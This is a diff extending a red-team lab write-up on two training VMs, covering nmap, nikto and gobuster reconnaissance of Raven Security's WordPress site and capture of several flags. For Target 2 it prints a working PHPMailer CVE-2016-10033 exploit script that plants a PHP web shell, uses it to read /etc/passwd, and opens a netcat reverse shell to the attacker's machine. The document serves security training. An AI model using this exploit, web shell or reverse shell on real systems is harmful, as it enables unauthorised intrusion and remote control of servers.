@@ -11,15 +11,68 @@ Nmap scan results for each machine reveal the below services and OS details:
 ```bash
 $ nmap -sS -sV 192.168.1.110
 Nmap scan report for 192.168.1.110
-Host is up (0.0019s latency).
+Host is up (0.00072s latency).
 Not shown: 995 closed ports
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
+|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
+|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
+|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
 80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Raven Security
 111/tcp open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          35506/udp   status
+|   100024  1          43456/tcp6  status
+|   100024  1          45566/tcp   status
+|_  100024  1          49362/udp6  status
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)
 MAC Address: 00:15:5D:00:04:10 (Microsoft)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3h40m00s, deviation: 6h21m03s, median: 0s
+|_nbstat: NetBIOS name: TARGET1, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.2.14-Debian)
+|   Computer name: raven
+|   NetBIOS computer name: TARGET1\x00
+|   Domain name: local
+|   FQDN: raven.local
+|_  System time: 2022-03-03T04:31:07+11:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-02T17:31:07
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.72 ms 192.168.1.110
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.02 seconds
+
 ```
 
 This scan identifies the services below as potential points of entry:
@@ -279,3 +332,311 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         ![flag4](images/flag4.png "flag4")
 
   
+---
+  
+The following is in regards to attacking Target 2.
+
+
+### Exposed Services (Target 2)
+
+Target 2 was identified with IP Address 192.168.1.115. Running an nmap scan yielded the following
+
+```bash
+root@Kali:~# nmap -sS -sV -A 192.168.1.115
+Nmap scan report for 192.168.1.115
+Host is up (0.00079s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
+|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
+|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
+|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
+80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Raven Security
+111/tcp open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          36833/tcp6  status
+|   100024  1          40477/udp6  status
+|   100024  1          41274/udp   status                                                                                                  
+|_  100024  1          55745/tcp   status                                                                                                  
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                      
+445/tcp open  netbios-ssn Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)                                                                  
+MAC Address: 00:15:5D:00:04:11 (Microsoft)                                                                                                 
+Device type: general purpose                                                                                                               
+Running: Linux 3.X|4.X                                                                                                                     
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3h40m00s, deviation: 6h21m03s, median: 0s
+|_nbstat: NetBIOS name: TARGET2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.2.14-Debian)
+|   Computer name: raven
+|   NetBIOS computer name: TARGET2\x00
+|   Domain name: local
+|   FQDN: raven.local
+|_  System time: 2022-03-03T04:24:57+11:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-02T17:24:57
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.79 ms 192.168.1.115
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds
+
+```
+This scan identifies the services below as potential points of entry:
+- Target 2
+  - SSH on port 22. We may be able to ssh into the target machine if we are able to find correct login information.
+  - The target is running an Apache server. We may be able to find an existing vulnerability related to Apache 2.4.10.
+
+
+Running a nikto scan on 192.168.1.115:
+
+```bash
+root@Kali:~# nikto -C all -h 192.168.1.115
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.115
++ Target Hostname:    192.168.1.115
++ Target Port:        80
++ Start Time:         2022-03-02 09:39:48 (GMT-8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 41b3, size: 5734482bdcb00, mtime: gzip
++ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26523 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2022-03-02 09:41:40 (GMT-8) (112 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+Note, similar to the Target 1, clicking around on the Raven Security site and clicking the blog hyperlink from the homepage led to the discovery of a Wordpress site.
+
+Running the same nikto scan against the Wordpress site:
+
+```bash
+root@Kali:~# nikto -C all -h http://192.168.1.115/wordpress
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.115
++ Target Hostname:    192.168.1.115
++ Target Port:        80
++ Start Time:         2022-03-02 09:44:11 (GMT-8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /wordpress/license.txt: License file found may identify site software.
++ /wordpress/: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ OSVDB-3268: /wordpress/wp-content/uploads/: Directory indexing found.
++ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
++ /wordpress/wp-login.php: Wordpress login found
++ 26522 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2022-03-02 09:46:22 (GMT-8) (131 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+To perform a more in depth enumeration we can use gobuster. gobuster was installed using `apt-get update` to first update the repositories and then `apt install gobuster` to actually install the application.
+
+```bash
+root@Kali:~# apt-get update
+Get:1 http://mirrors.jevincanders.net/kali kali-rolling InRelease [30.6 kB]
+Get:2 http://mirrors.jevincanders.net/kali kali-rolling/main amd64 Packages [18.0 MB]
+Get:3 http://mirrors.jevincanders.net/kali kali-rolling/non-free amd64 Packages [176 kB]
+Get:4 http://mirrors.jevincanders.net/kali kali-rolling/contrib amd64 Packages [105 kB]
+Fetched 18.3 MB in 4s (4,815 kB/s)                        
+Reading package lists... Done
+root@Kali:~# apt install gobuster
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  bbqsql docutils-common docutils-doc libpython-all-dev python-all python-all-dev python-bson python-bson-ext python-crypto
+  python-docutils python-entrypoints python-gevent python-greenlet python-gridfs python-keyring python-keyrings.alt python-pip
+  python-pip-whl python-pygments python-pymongo python-pymongo-ext python-roman python-simplejson python-tqdm python-wheel python-xdg
+  sgml-base webhandler xml-core
+Use 'apt autoremove' to remove them.
+The following NEW packages will be installed:
+  gobuster
+0 upgraded, 1 newly installed, 0 to remove and 2006 not upgraded.
+Need to get 2,189 kB of archives.
+After this operation, 7,582 kB of additional disk space will be used.
+Get:1 http://mirrors.jevincanders.net/kali kali-rolling/main amd64 gobuster amd64 3.1.0-0kali1 [2,189 kB]
+Fetched 2,189 kB in 1s (1,622 kB/s)   
+Selecting previously unselected package gobuster.
+(Reading database ... 311925 files and directories currently installed.)
+Preparing to unpack .../gobuster_3.1.0-0kali1_amd64.deb ...
+Unpacking gobuster (3.1.0-0kali1) ...
+Setting up gobuster (3.1.0-0kali1) ...
+Processing triggers for kali-menu (2020.1.7) ...
+```
+
+Using gobuster:
+
+```bashroot@Kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  dir -u 192.168.1.115
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.115
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/02 09:55:01 Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 312] [--> http://192.168.1.115/img/]
+/css                  (Status: 301) [Size: 312] [--> http://192.168.1.115/css/]
+/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.115/wordpress/]
+/manual               (Status: 301) [Size: 315] [--> http://192.168.1.115/manual/]   
+/js                   (Status: 301) [Size: 311] [--> http://192.168.1.115/js/]       
+/vendor               (Status: 301) [Size: 315] [--> http://192.168.1.115/vendor/]   
+/fonts                (Status: 301) [Size: 314] [--> http://192.168.1.115/fonts/]    
+/server-status        (Status: 403) [Size: 301]                                      
+                                                                                     
+===============================================================
+2022/03/02 09:56:32 Finished
+===============================================================
+```
+
+As previously we are able to more clearly see that there is indeed a Wordpress installation on the server. One of the interesting directories to look into is the `/vendor` directory.
+
+
+If I navigate to `http://192.168.1.115/vendor` and sort the items in order of Last Modified descending, I can see there is a `path` file modified more recently than the other files.
+
+![Vendor](images/vendor.PNG "Vendor")
+
+Opening this file led to the discovery of the first flag.
+
+![Target2 Flag1](images/target2Flag1.PNG "Target 2 Flag 1")
+
+```
+flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+```
+
+Within the same `vendor` directory there is a `README.MD` file. Opening this file shows that it is in regards to a module called `PHPMailer` which is used for email creation and transferring within PHP.
+
+![PHPMailer README](images/phpMailerReadme.PNG "PHPMailer README")
+
+Also the same `vendor` directory there is a `VERSION` file. Opening this file indicates that the PHPMailer version is `5.2.16`.
+
+We can use `searchspoit` to see whether there may be an existing exploit for this version of PHPMailer. Using searchspoit we have:
+
+![PHPMailer searchsploit](images/searchsploit.PNG "PHPMailer searchsploit")
+
+Looking into the first couple of PHP < 5.2.18 - Remote Execution scripts we can see that the exploits were disclosed as part of `CVE-2016-10033`.
+
+Using the provided `exploit.sh` script I made the modification to point to the correct target.
+
+```sh
+#!/bin/bash
+# Lovingly borrowed from: https://github.com/coding-boot-camp/cybersecurity-v2/new/master/1-Lesson-Plans/24-Final-Project/Activities/Day-1/Unsolved
+
+TARGET=http://raven.local/contact.php
+
+DOCROOT=/var/www/html
+FILENAME=backdoor.php
+LOCATION=$DOCROOT/$FILENAME
+
+STATUS=$(curl -s \
+              --data-urlencode "name=Hackerman" \
+              --data-urlencode "email=\"hackerman\\\" -oQ/tmp -X$LOCATION blah\"@badguy.com" \
+              --data-urlencode "message=<?php echo shell_exec(\$_GET['cmd']); ?>" \
+              --data-urlencode "action=submit" \
+              $TARGET | sed -r '146!d')
+
+if grep 'instantiate' &>/dev/null <<<"$STATUS"; then
+  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
+else
+  echo "[!] Exploit failed"
+fi
+```
+[Exploit Script](exploit.sh)
+
+This script uploads a backdoor.php file after it has been run. The backdoor can then be used to exploit remote code execution.
+
+![Exploit](images/exploitRan.PNG "Exploit")
+
+
+To test this I navigated to `http://192.168.1.115/backdoor.php?cmd=cmd=cat%20/etc/passwd`. This should execute the command `cat /etc/passwd` and output to the screen. Viewing the Page Source output made the command output easier to read.
+
+![passwd](images/passwd.PNG "passwd")
+
+Since we have access to remote code execution we can set up a reverse shell. On my Kali machine I set up a netcat listener on port 4444. And on Target 2, I connected to the same listener by navigating to the url `http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`.
+
+
+![reverse shell](images/reverseShell.PNG "reverse shell")
+
+
+To find flag2, I did a `cd /var/www/` and did an `ls` the flag 2 was listed as a file in the directory.
+
+
+![Target 2 Flag 2](images/target2Flag2.PNG "Target 2 Flag 2")
+
+
+```
+flag2{6a8ed560f0b5358ecf844108048eb337}
+```
+
+To find flag 3 I ran `find /var/www -type f -iname 'flag*'`. There was a flag in the wordpress folder located at `/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png`
+
+```bash
+find /var/www -type f -iname 'flag*'
+/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
+/var/www/flag2.txt
+```
+
+Navigating to http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
+
+![Target 2 Flag 3](images/target2Flag3.PNG "Target 2 Flag 3")
+
+```
+flag3{a0f568aa9de277887f37730d71520d9b}
+```
